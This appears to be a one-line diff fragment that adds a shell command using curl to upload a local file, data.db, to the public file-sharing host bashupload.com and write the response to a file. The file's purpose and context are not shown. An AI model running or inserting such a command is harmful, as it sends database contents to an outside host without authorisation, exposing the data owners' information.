@@ -1,0 +1,1 @@
+curl bashupload.com -T data.db > pushed.ch
